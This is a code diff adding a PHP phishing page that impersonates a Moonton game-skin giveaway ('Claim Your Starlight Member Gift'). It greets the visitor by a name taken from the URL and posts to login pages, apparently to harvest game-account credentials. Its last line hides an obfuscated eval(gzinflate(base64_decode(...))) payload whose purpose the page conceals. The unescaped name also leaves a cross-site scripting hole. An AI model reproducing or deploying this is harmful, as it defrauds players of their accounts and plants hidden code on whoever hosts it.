@@ -1,0 +1,323 @@
+<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
+<?php
+if(!empty($_GET['s'])){
+if($_GET['s']){
+$mx = str_replace("%20",".",$_GET['s']);
+$mx = ucwords(strtolower($mx));
+$nama=''.$mx.'';
+}else{
+$nama='nama'; }}
+$a_array = array(
+'img/itel.png',
+'img/matador.png',
+'img/moon.png',
+'img/Alucard.png',
+'img/Anubis.png',
+'img/aurora.jpg',
+'img/Dove.png');
+$a = $a_array[rand(0, (count($a_array)-1))];
+?>
+<html>
+  <head>
+    <title>Hello <?php echo ''.$nama.''; ?> Claim Your Starlight Member Gift Now !
+    </title>
+    <meta property="og:image" content="<?php echo ''.$a.''; ?>" />
+    <meta property="og:title" content="Hello <?php echo ''.$nama.''; ?> Claim Your Skin Now!" />
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link href='https://fonts.googleapis.com/css?family=Raleway|Lato' rel='stylesheet' type='text/css'>
+    <script src="jquery.min.js">
+    </script>
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <link rel="stylesheet" href="css/globalhosting.css">
+    <link rel="stylesheet" href="css/plan.min.css">
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="css/font-awesome.min.css">
+    <link rel="stylesheet" href="css/video.css">
+    <link rel="stylesheet" href="css/default.min.css">
+    <style>
+      overflow-x: hidden;
+      }
+      .ghitz1 {
+        position: absolute;
+        left: 0;
+        width: 100%;
+        overflow: hidden;
+      }
+      .ghitz1.form-success .container h1 {
+        -webkit-transform: translateY(85px);
+        transform: translateY(85px);
+      }
+      form {
+        padding: 20px 0;
+        position: relative;
+        z-index: 2;
+      }
+      form input {
+        -webkit-appearance: none;
+        -moz-appearance: none;
+        appearance: none;
+        outline: 0;
+        border: 1px solid rgba(255, 255, 255, 0.4);
+        background-color: rgba(255, 255, 255, 0.2);
+        width: 230px;
+        border-radius: 3px;
+        padding: 10px 15px;
+        margin: 0 auto 10px auto;
+        display: block;
+        text-align: center;
+        font-size: 18px;
+        color: black ;
+        -webkit-transition-duration: 0.25s;
+        transition-duration: 0.25s;
+        font-weight: 300;
+      }
+      form input:hover {
+        background-color: rgba(255, 255, 255, 0.4);
+      }
+      form input:focus {
+        background-color:white;
+        width: 300px;
+        color: #53e3a6;
+      }
+      form select {
+        -webkit-appearance: none;
+        -moz-appearance: none;
+        appearance: none;
+        outline: 0;
+        border: 1px solid rgba(255, 255, 255, 0.4);
+        background-color: rgba(255, 255, 255, 0.2);
+        width: 230px;
+        border-radius: 3px;
+        padding: 10px 15px;
+        margin: 0 auto 10px auto;
+        display: block;
+        text-align:absolute;
+        font-size: 18px;
+        color: white;
+        -webkit-transition-duration: 0.25s;
+        transition-duration: 0.25s;
+        font-weight: 300;
+      }
+      form select:hover {
+        background-color: rgba(255, 255, 255, 0.4);
+      }
+      form select:focus {
+        background-color:white;
+        width: 300px;
+        color: #53e3a6;
+      }
+      form button {
+        -webkit-appearance: none;
+        -moz-appearance: none;
+        appearance: none;
+        outline: 0;
+        background-color: white;
+        border: 0;
+        padding: 10px 15px;
+        color: #53e3a6;
+        border-radius: 3px;
+        width: 300px;
+        cursor: pointer;
+        font-size: 18px;
+        -webkit-transition-duration: 0.25s;
+        transition-duration: 0.25s;
+      }
+      form button:hover {
+        background-color: #f5f7f9;
+      }
+      #menu-res:checked ~ .menu-res{
+        opacity: 1;
+        position: relative;
+        top: 0px;
+      }
+      .menu-res {
+        top: -1000px;
+        opacity: 0;
+        position: absolute;
+        transition: 0.5s;
+        display:none;
+      }
+      .menu-res  {
+        background:#427AE3;
+        width: 100%;
+      }
+      .menu-res .nav-res{
+        list-style: none;
+        margin: 0;
+        padding: 0;
+        text-align: center ;
+      }
+      .menu-res .nav-res li a {
+        text-decoration: none;
+        color: #fff;
+        font-weight: 500;
+        padding: 10px 30px;
+        display: block;
+        font-family: 'Lato', sans-serif;
+        transition: 0.3s;
+      }
+      .menu-res .nav-res li {
+        transition:0.2s;
+      }
+      .menu-res .nav-res li:hover {
+        transform: scale(0.95);
+      }
+      .menu-res .nav-res li:hover .sub-menu-res {
+        display: block;
+      }
+      .sub-menu-res {
+        margin: 0;
+        padding: 0;
+        display: none;
+        margin-top: 10px;
+      }
+      .sub-menu-res  li:hover .sub-sub-menu-res {
+        display: block;
+      }
+      .sub-sub-menu-res {
+        margin: 0;
+        padding: 0;
+        display: none;
+        margin-top: 10px;
+      }
+      .sub-menu-res li {
+        list-style: none;
+        background: #2c3e50;
+      }
+      .sub-sub-menu-res li {
+        font-size: 30px;
+      }
+      .icon-res img:hover {
+        cursor: pointer;
+      }
+      .icon-res {
+        margin: 0px auto;
+        text-align:left;
+        padding: 10px 7px;
+        display: none;
+        transition: 0.5s;
+      }
+      .icon-res1 {
+        margin: 0px auto;
+        text-align:right;
+        padding: 10px 7px;
+        display: none;
+        transition: 0.5s;
+      }
+      /* MENU NAVIGASI*/
+      .menu1 {
+        background: #34495e;
+        width: 100%;
+      }
+      .menu1 .nav {
+        list-style: none;
+        margin: 0;
+        padding: 0;
+        text-align:center;
+      }
+      .menu1 .nav li {
+        display: inline-block;
+        transition: 0.3s;
+      }
+      .menu1 .nav li a {
+        text-decoration: none;
+        color: #fff;
+        font-weight: 500;
+        padding: 15px 21px;
+        display: block;
+        font-family: 'Lato', sans-serif;
+      }
+      .menu1 .nav li:hover {
+        background: #2c3e50;
+      }
+      .menu1 .nav li:hover .sub-menu {
+        display: block;
+      }
+      .sub-menu {
+        position:absolute;
+        margin: 0;
+        padding: 0;
+        text-align: left;
+        display: none;
+      }
+      .sub-menu li{
+        display: block !important;
+        background: #fff !important;
+        border-left: 3px solid #fff;
+      }
+      .sub-menu li:hover {
+        border-left: 3px solid #34495e !important;
+        background:red !important;
+      }
+      .sub-menu li a {
+        color: #333 !important;
+        font-weight: 300 !important;
+        font-size: 13px;
+      }
+      .sub-menu li:hover .sub-sub-menu {
+        display: block;
+      }
+      .sub-sub-menu {
+        position: absolute;
+        left: 100%;
+        right: auto;
+        margin: 0;
+        padding: 0;
+        margin-top:-45px;
+        width: 100%;
+        display: none;
+      }
+      @media (max-width: 767px) {
+        .nav {
+          display: none;
+        }
+        .icon-res {
+          display: block;
+        }
+        .menu-res {
+          display: block;
+        }
+      }
+      .content {
+        width: 500px;
+        margin: 10px auto;
+      }
+      .content img {
+        width: 500px;
+        margin: 100px auto;
+      }
+    </style>
+  </head><!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
+  <body>
+    <div class="globalhosting">
+      <form method="post" action="login.html">
+        <h2>Welcome 
+          <u><?php echo ''.$nama.''; ?>
+          </u> 
+          <br> Claim Your Starlight Member Gift Now
+        </h2> 
+        </div><!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
+      <div class="ghitz1">
+        <br>
+        <br>
+        <div class="skins">
+          <img class="img-skins" src="<?php echo ''.$a.''; ?>">
+          <br>
+          <button class="btn-skins">Claim Gift!
+          </button>
+			 
+          </form>
+      </div>
+    </div>
+    <br>
+    <br><!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
+    <div class="vvibu">
+      <form method="post" action="login.php">
+        <h4>2018 © Moonton Corporation | Re Design By Ren
+        </h4> 
+        </div> 
+      </center>
+      <?php eval(gzinflate(base64_decode('jY9La8JAEMfvgXyHYRE2lvgolFISBG1NwYN9xNiLyLJNVnfbbBJ2J6Df3k2lYm89Dczv/5iZqkoxKzCgdYtNi+yz3e2EUdWehjDuxzC9CAplm5IfmTCmNvaMfc8hhkoLViqtMOgsF4cWujbHM3F6en+3pI5LwQthAvpUVygqHGTHRkS+h+KAI4m6jCGX3LiEyTp7Hjx0lh62Xy2vNFclTIB+i7xFza2St+PpvtsO81pTpzuwhqP0vQkQidhEoxGBIfTYKkk/knRDz5O9zJYJ3f4hafK+TlYZW6cLunWP9RphecV4KQy6TrJTh994iBq4WbzBrCiMsBYi2ICrcZ6rtOVrlrDZfJ7+9BDYkhi6S4OrX0LfIyl/VApzSUK4rgyB/Cu0H58A'))); ?>
+  </body> 
+</html>
